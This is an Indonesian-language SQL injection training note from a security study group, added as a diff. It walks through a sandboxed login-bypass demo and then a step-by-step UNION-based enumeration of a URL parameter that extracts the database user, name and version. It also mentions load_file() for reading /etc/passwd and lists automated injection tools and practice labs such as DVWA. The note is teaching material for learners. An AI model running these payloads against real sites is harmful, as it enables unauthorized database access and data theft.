@@ -1,0 +1,123 @@
+__/\\\________/\\\_____/\\\\\\\\\\\____/\\\___________________/\\\\\__________/\\\\\\\\\\\___        
+ _\/\\\_____/\\\//____/\\\/////////\\\_\/\\\_________________/\\\///\\\______/\\\/////////\\\_       
+  _\/\\\__/\\\//______\//\\\______\///__\/\\\_______________/\\\/__\///\\\___\//\\\______\///__      
+   _\/\\\\\\//\\\_______\////\\\_________\/\\\______________/\\\______\//\\\___\////\\\_________     
+    _\/\\\//_\//\\\_________\////\\\______\/\\\_____________\/\\\_______\/\\\______\////\\\______    
+     _\/\\\____\//\\\___________\////\\\___\/\\\_____________\//\\\______/\\\__________\////\\\___   
+      _\/\\\_____\//\\\___/\\\______\//\\\__\/\\\______________\///\\\__/\\\_____/\\\______\//\\\__  
+       _\/\\\______\//\\\_\///\\\\\\\\\\\/___\/\\\\\\\\\\\\\\\____\///\\\\\/_____\///\\\\\\\\\\\/___ 
+        _\///________\///____\///////////_____\///////////////_______\/////_________\///////////_____
+
+CATATAN PELATIHAN KSLOS 11/10/2017, SQLInjection.txt
+Materi Pelatihan : SQL Injection
+
+SQL (Structered-Query-Language)
+Adalah bahasa yang paling umum digunakan pada database management.
+
+Contoh SQL :
+
+--| SELECT id FROM UserData WHERE Username='CyberMask';
+--| $mysqli->query("SELECT id FROM `UserData` WHERE Username='CyberMask'");
+
+Bagaimana SQL Injection Bekerja ?
+Step 1 : Open http://sqlfiddle.com/
+Step 2 : Masukan Command dibawah ini :
+---------------------------------------------------------------------
+CREATE TABLE `users` (
+  `id` INT NOT NULL AUTO_INCREMENT,
+  `email` VARCHAR(45) NULL,
+  `password` VARCHAR(45) NULL,
+  PRIMARY KEY (`id`));
+  
+  
+insert into users (email,password) values ('m@m.com',md5('abc'));
+---------------------------------------------------------------------
+Step 3 : Klik Build Schema
+Step 4 : masukan "SELECT * FROM users;"
+Step 5 : Klik Run SQL
+Step 6 : coba masukan code ini
+--------------------------------------------------------------------
+SELECT * FROM users WHERE email = 'admin@admin.sys' AND password = md5('1234');
+--------------------------------------------------------------------
+dari code di atas kita tidak akan mendapatkan output dikarenakan password yang diterima tidak sama dengan di database, kita dapat mengatasi ini dengan mengubah inputannya menjadi 
+---------------------------------------------------------------------
+xxx@xxx.xxx' OR 1=1 LIMIT 1 --']
+---------------------------------------------------------------------
+gabungkan code diatas dengan SQL sebelumnya sehingga menjadi :
+---------------------------------------------------------------------
+SELECT * FROM users WHERE email = 'xxx@xxx.xxx' OR 1 = 1 LIMIT 1 -- ' ] AND password = md5('1234');
+---------------------------------------------------------------------
+
+Serangan SQL tidak hanya sampai disini, beberapa yang dapat dilakukan oleh SQL injection :
+- Deleting data
+- Updating data
+- Inserting data
+- Menjalankan command pada server untuk mendownload dan menginstall program yang berbahaya seperti Trojans, dll
+- Exporting data-data yang berharga seperti credit card, email, dan passwords ke attacker's remote server 
+
+Beberapa tools otomatis untuk melakukan SQL Injection :
+- SQLSmack 
+http://www.securiteam.com/tools/5GP081P75C.html
+- SQLPing 2 
+http://www.sqlsecurity.com/downloads/sqlping2.zip?attredirects=0&d=1
+- SQLMap
+http://sqlmap.org/
+- Havij PRO
+
+Some Command you need to know :
+-- 'union all select'
+combines two or more select statements into one query and returns all rows
+
+-- 'order by'
+used to sort rows after a select statement is executed
+
+-- 'load_file()'
+loads a local file from the site or server examples would be .htaccess or /etc/passwd
+
+-- 'char()'
+used to change decimal ascii to strings, can be used for filter evasion--in sql injections, used in conjunction with load_file
+
+-- 'concat()'
+combines more than one column into a single column, enabling more columns to be selected than the number that are showing on the page (You will understand better later)
+
+-- '—' and '/*'
+command type of comment
+
+SQL Injection pada parameter URL :
+kalian menemukan url seperti dibawah ini
+--| http://www.site.com/index.php?id=5'
+untuk mengecek tingkat vulnerable website tersebut terhadap SQL injection akan dimulai dengan memasukan query, contohnya :
+--| /index.php?id=5 and 1=0--
+jika tidak bisa, cobalah tidak memasukan apa-apa ke dalam querynya
+--| /index.php?id='
+Selanjutnya kita akan mencari banyaknya data:
+--| /index.php?id=5 order by 20
+jika mendapatkan error maka jumlah datanya ada di bawah 20, maka kurangin angka 20 sampai tidak mendapatkan error
+--| /index.php?id=5 order by 15 <--returns no error
+--| /index.php?id=5 order by 16 <--returns error
+misalkan kita tidak mendapatkan error pada jumlah 15 dan error pada jumlah 16 maka kita mengetahui bahwa ada 15 data.
+Statement selanjutnya akan digunakan untuk mengetahui kolom mana yang dapat diekstrak datanya
+--| /index.php?id=null union all select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- 
+selanjutnya kalian dapat mulai untuk mengumpulkan informasi dari database tersebut
+--| /index.php?id=null union all select 1,2,3,4,user(),6,database(),8,version(),10,11,12,1 3,14,15--
+setelah kita mengetahui maka kita akan menggabungkan semua hasil yang kita dapat didalam satu kolom
+--| /index.php?id=null union all select 1,2,3,4,concat(user(),char(58),database(),char(58) ,version()),6,7,8,9,10,11,12,13,14,15--
+
+Untuk informasi selanjutnya dapat dibaca dari :
+____________________________________________________
+Referensi :
+http://www.theprohack.com/2010/04/sql-injection-learn-to-attack.html
+https://www.guru99.com/learn-sql-injection-with-practical-example.html
+https://www.veracode.com/security/sql-injection
+https://null-byte.wonderhowto.com/how-to/sql-injection-detailed-introduction-0166944/
+https://en.wikipedia.org/wiki/SQL
+https://leanpub.com/SQLI-LABS
+http://php.net/
+
+Game :
+http://www.dvwa.co.uk/
+https://github.com/eLVee1991/DVWA/
+https://github.com/OWASP/SecurityShepherd
+https://github.com/Audi-1/sqli-labs
+
+
